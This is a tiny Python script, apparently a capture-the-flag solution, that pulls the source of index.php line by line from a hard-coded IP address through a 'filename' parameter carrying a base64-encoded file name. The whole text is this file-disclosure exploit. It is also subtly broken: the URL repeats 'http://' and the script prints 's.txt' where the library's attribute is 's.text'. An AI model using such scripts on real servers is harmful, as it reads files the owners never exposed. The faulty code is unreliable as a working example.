import requests
a=30
for i in range(a):
     url="http://http://114.67.246.176:16788/index.php?line="+str(i)+"&filename=aW5kZXgucGhw"
     s=requests.get(url)
     print(s.txt)